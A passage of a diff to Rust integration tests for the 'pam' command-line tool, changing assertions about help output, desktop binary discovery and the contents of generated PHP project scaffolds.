-    assert!(compatibility_help.contains("--refresh"));
-
-    let autoscale_help = run_pam(&["autoscale", "--help"]);
-    assert!(autoscale_help.status.success());
-    let autoscale_help = String::from_utf8_lossy(&autoscale_help.stderr);
-    assert!(autoscale_help.contains("PAM / AUTOSCALE"));
-    assert!(autoscale_help.contains("--metrics-url URL"));
-
-    let mcp_help = run_pam(&["mcp", "--help"]);
-    assert!(mcp_help.status.success());
-    assert!(String::from_utf8_lossy(&mcp_help.stderr).contains("MCP stdio"));
 
     let version = run_pam(&["--version"]);
     assert!(version.status.success());
@@ -1378,40 +406,6 @@ fn delegates_desktop_commands_and_exposes_the_pam_binary() {
     assert!(
         stdout.contains(env!("CARGO_BIN_EXE_pam")),
         "PAM_BINARY was not propagated: {stdout}",
-    );
-
-    fs::remove_dir_all(directory).unwrap();
-}
-
-#[cfg(unix)]
-#[test]
-fn discovers_the_composer_desktop_binary_in_the_project() {
-    use std::os::unix::fs::PermissionsExt;
-
-    let directory = temporary_path("desktop-composer-bin");
-    let vendor = directory.join("vendor");
-    let desktop = vendor.join("bin/pam-desktop");
-    fs::create_dir_all(desktop.parent().unwrap()).unwrap();
-    fs::write(directory.join("composer.json"), "{}\n").unwrap();
-    fs::write(vendor.join("autoload.php"), "<?php\n").unwrap();
-    fs::write(
-        &desktop,
-        "#!/bin/sh\nprintf 'composer-desktop=%s|%s\\n' \"$1\" \"$2\"\nexit 19\n",
-    )
-    .unwrap();
-    fs::set_permissions(&desktop, fs::Permissions::from_mode(0o755)).unwrap();
-
-    let output = Command::new(env!("CARGO_BIN_EXE_pam"))
-        .args(["desktop", "dev", "."])
-        .current_dir(&directory)
-        .env_remove("PAM_DESKTOP_BINARY")
-        .output()
-        .unwrap();
-
-    assert_eq!(output.status.code(), Some(19));
-    assert_eq!(
-        String::from_utf8_lossy(&output.stdout),
-        "composer-desktop=dev|.\n",
     );
 
     fs::remove_dir_all(directory).unwrap();
@@ -1458,28 +452,8 @@ fn initializes_a_project_without_overwriting_files() {
     assert!(directory.join(".env.example").is_file());
     assert!(directory.join("phpunit.xml").is_file());
     assert!(directory.join("tests/ApplicationTest.php").is_file());
-    let manifest: serde_json::Value =
-        serde_json::from_str(&fs::read_to_string(directory.join("composer.json")).unwrap())
-            .unwrap();
-    assert_eq!(manifest["require"]["pushinbr/pam-api"], "^0.1");
-    assert_eq!(manifest["require-dev"]["pushinbr/pam-testing"], "^0.1");
-    assert_eq!(manifest["license"], "proprietary");
-    assert!(
-        manifest["description"]
-            .as_str()
-            .is_some_and(|value| !value.is_empty())
-    );
-    for section in ["require", "require-dev"] {
-        assert!(
-            manifest[section]
-                .as_object()
-                .unwrap()
-                .keys()
-                .all(|package| !package.starts_with("pam/")),
-            "legacy Composer coordinate generated in {section}: {}",
-            manifest[section],
-        );
-    }
+    let manifest = fs::read_to_string(directory.join("composer.json")).unwrap();
+    assert!(manifest.contains("\"pam/api\""));
 
     let repeated = run_pam(&["init", directory.to_str().unwrap()]);
     assert!(!repeated.status.success());
@@ -1524,18 +498,8 @@ fn initializes_raw_and_socket_presets_without_composer() {
         "{}",
         String::from_utf8_lossy(&output.stderr)
     );
-    let manifest: serde_json::Value =
-        serde_json::from_str(&fs::read_to_string(api.join("composer.json")).unwrap()).unwrap();
-    assert_eq!(manifest["require"]["pushinbr/pam-api"], "^0.1");
-    assert_eq!(manifest["require"]["pushinbr/pam-socket"], "^0.1");
-    assert_eq!(manifest["require-dev"]["pushinbr/pam-testing"], "^0.1");
-    assert!(
-        manifest["require"]
-            .as_object()
-            .unwrap()
-            .keys()
-            .all(|package| !package.starts_with("pam/"))
-    );
+    let manifest = fs::read_to_string(api.join("composer.json")).unwrap();
+    assert!(manifest.contains("pam/socket"));
 
     fs::remove_dir_all(raw).unwrap();
     fs::remove_dir_all(api).unwrap();
@@ -1558,27 +522,24 @@ fn initializes_mobile_with_tree_default_and_pam_components_enabled() {
         String::from_utf8_lossy(&output.stderr)
     );
 
-    let manifest: serde_json::Value =
-        serde_json::from_str(&fs::read_to_string(directory.join("composer.json")).unwrap())
-            .unwrap();
+    let manifest = fs::read_to_string(directory.join("composer.json")).unwrap();
+    let manifest_json: serde_json::Value = serde_json::from_str(&manifest).unwrap();
     let entry = fs::read_to_string(directory.join("index.php")).unwrap();
     let hello = fs::read_to_string(directory.join("src/Hello.php")).unwrap();
     assert!(
-        manifest["require"]["pushinbr/pam-native"] == "^0.2"
-            || manifest["require"]["pam/native"] == "^0.2"
+        manifest_json["require"]["pushinbr/pam-native"] == "^0.1"
+            || manifest_json["require"]["pam/native"] == "^0.1"
     );
-    assert!(manifest["require"]["pushinbr/pam-mobile-ui"].is_null());
-    if let Some(repositories) = manifest["repositories"].as_array() {
-        assert!(
-            repositories
-                .iter()
-                .all(|repository| repository["options"]["symlink"] == false)
-        );
-    }
+    assert!(!manifest.contains("pushinbr/pam-mobile-ui"));
     assert!(entry.contains("App::components(__DIR__.'/src'"));
     assert!(entry.contains("App::run(new Hello())"));
     assert!(hello.contains("public function render(): Element"));
     assert!(hello.contains("Screen::make("));
+    assert!(
+        !directory
+            .join("resources/native/screens/hello.pam")
+            .exists()
+    );
 
     fs::remove_dir_all(directory).unwrap();
 }
@@ -1600,21 +561,17 @@ fn initializes_mobile_with_the_official_ui_and_single_file_components() {
         String::from_utf8_lossy(&output.stderr)
     );
 
-    let manifest: serde_json::Value =
-        serde_json::from_str(&fs::read_to_string(directory.join("composer.json")).unwrap())
-            .unwrap();
+    let manifest = fs::read_to_string(directory.join("composer.json")).unwrap();
+    let manifest_json: serde_json::Value = serde_json::from_str(&manifest).unwrap();
     let entry = fs::read_to_string(directory.join("index.php")).unwrap();
     let hello = fs::read_to_string(directory.join("src/Hello.pam.php")).unwrap();
-    assert_eq!(manifest["require"]["pushinbr/pam-mobile-ui"], "^0.2");
-    if let Some(repositories) = manifest["repositories"].as_array() {
-        assert!(!repositories.is_empty());
-        assert!(
-            repositories
-                .iter()
-                .all(|repository| repository["options"]["symlink"] == false)
-        );
-    }
-    assert!(entry.contains("MobileUi::mode(ThemeMode::System)"));
+    assert!(
+        manifest_json["require"]["pushinbr/pam-native"] == "^0.1"
+            || (manifest_json["require"]["pam/native"] == "^0.1"
+                && manifest_json["replace"]["pushinbr/pam-native"] == env!("CARGO_PKG_VERSION"))
+    );
+    assert!(manifest.contains("\"pushinbr/pam-mobile-ui\": \"^0.1\""));
+    assert!(entry.contains("PamUI::mode(ThemeMode::System)"));
     assert!(entry.contains("App::run(App::make(Hello::class))"));
     assert!(hello.contains("#[State]"));
     assert!(hello.contains("<PamUIProvider mode=\"system\">"));
@@ -1642,7 +599,6 @@ fn initializes_a_servo_desktop_project_with_php_commands() {
 
     let manifest = fs::read_to_string(directory.join("composer.json")).unwrap();
     let application = fs::read_to_string(directory.join("app.php")).unwrap();
-    let plugin = fs::read_to_string(directory.join("src/HelloPlugin.php")).unwrap();
     let html = fs::read_to_string(directory.join("resources/index.html")).unwrap();
     let styles = fs::read_to_string(directory.join("resources/styles.css")).unwrap();
     let javascript = fs::read_to_string(directory.join("resources/app.js")).unwrap();
@@ -1651,12 +607,12 @@ fn initializes_a_servo_desktop_project_with_php_commands() {
     let inspector_javascript =
         fs::read_to_string(directory.join("resources/inspector.js")).unwrap();
 
-    assert!(manifest.contains("\"pushinbr/pam-desktop\""));
-    assert!(manifest.contains("\"pushinbr/pam-desktop\": \"^1.1\""));
+    assert!(manifest.contains("\"pam/desktop\""));
+    assert!(manifest.contains("\"pam/desktop\": \"^0.5\""));
     assert!(manifest.contains("pam desktop build ."));
     assert!(manifest.contains("pam desktop dev ."));
-    assert!(application.contains("Application::make"));
-    assert!(application.contains("->load('resources/index.html')"));
+    assert!(application.contains("Application::create"));
+    assert!(application.contains("Manifest::create"));
     assert!(application.contains("ApplicationCategory::Development"));
     assert!(application.contains("->window("));
     assert!(application.contains("ClientEvent"));
@@ -1664,36 +620,14 @@ fn initializes_a_servo_desktop_project_with_php_commands() {
     assert!(application.contains("Capabilities::none()"));
     assert!(application.contains("FileSystemRoot::readWrite"));
     assert!(application.contains("WindowEffect::title"));
-    assert!(application.contains("Shell::none()"));
-    assert!(application.contains("MenuItem::command"));
-    assert!(application.contains("TrayCloseBehavior::Hide"));
-    assert!(application.contains("GlobalShortcut::create"));
-    assert!(application.contains("BackgroundJob::every"));
-    assert!(application.contains("new App\\HelloPlugin()"));
-    assert!(application.contains("Application::API_VERSION"));
-    assert!(application.contains("Application::PROTOCOL_VERSION"));
-    assert!(plugin.contains("implements Plugin"));
-    assert!(plugin.contains("'runtime.snapshot'"));
     assert!(html.contains("/_pam/bridge.js"));
-    assert!(html.contains("<html lang=\"en\">"));
     assert!(html.contains("aria-live=\"polite\""));
-    assert!(html.contains("IPC v6"));
+    assert!(html.contains("IPC v5"));
     assert!(html.contains("Native Lab"));
-    assert!(html.contains("STABLE API · 1.0"));
-    assert!(html.contains("Desktop software,"));
-    assert!(html.contains("PHP-FIRST DESKTOP RUNTIME"));
-    assert!(html.contains("PHP + Rust plugins"));
-    assert!(html.contains("Updates with rollback"));
-    assert!(!html.contains("Atualizações com rollback"));
+    assert!(html.contains("Atualizações com rollback"));
     assert!(styles.contains("prefers-reduced-motion"));
     assert!(styles.contains(":focus-visible"));
-    assert!(styles.contains("@media (max-width: 980px)"));
-    assert!(styles.contains("@media (max-width: 680px)"));
-    assert!(styles.contains("@media (max-width: 390px)"));
-    assert!(styles.contains(".control-grid"));
-    assert!(styles.contains(".pipeline"));
     assert!(javascript.contains("window.pam.invoke(\"greet\""));
-    assert!(javascript.contains("window.pam.apiVersion !== 1"));
     assert!(javascript.contains("window.pam.on(\"pam.dev.reloaded\""));
     assert!(javascript.contains("{ timeout: 5_000 }"));
     assert!(javascript.contains("window.pam.fs.writeText"));
@@ -1702,16 +636,12 @@ fn initializes_a_servo_desktop_project_with_php_commands() {
     assert!(javascript.contains("window.pam.notification.show"));
     assert!(javascript.contains("window.pam.on(\"pam.drag.drop\""));
     assert!(javascript.contains("window.pam.updater.status"));
-    assert!(javascript.contains("window.pam.invoke(\n                \"runtime.snapshot\""));
-    assert!(javascript.contains("window.pam.on(\"pam.job.completed\""));
-    assert!(javascript.contains("window.pam.on(\"pam.menu.selected\""));
     assert!(directory.join("storage/.gitkeep").is_file());
     assert!(directory.join("resources/icon.svg").is_file());
     assert!(inspector.contains("Runtime Inspector"));
     assert!(inspector.contains("/_pam/bridge.js"));
     assert!(inspector_styles.contains("prefers-reduced-motion"));
     assert!(inspector_javascript.contains("window.pam.windowId"));
-    assert!(inspector_javascript.contains("apiVersion"));
 
     let invalid = run_pam(&[
         "init",
@@ -1723,7 +653,7 @@ fn initializes_a_servo_desktop_project_with_php_commands() {
     ]);
     assert!(!invalid.status.success());
     assert!(
-        String::from_utf8_lossy(&invalid.stderr).contains("does not use --socket"),
+        String::from_utf8_lossy(&invalid.stderr).contains("do not use --socket"),
         "{}",
         String::from_utf8_lossy(&invalid.stderr),
     );
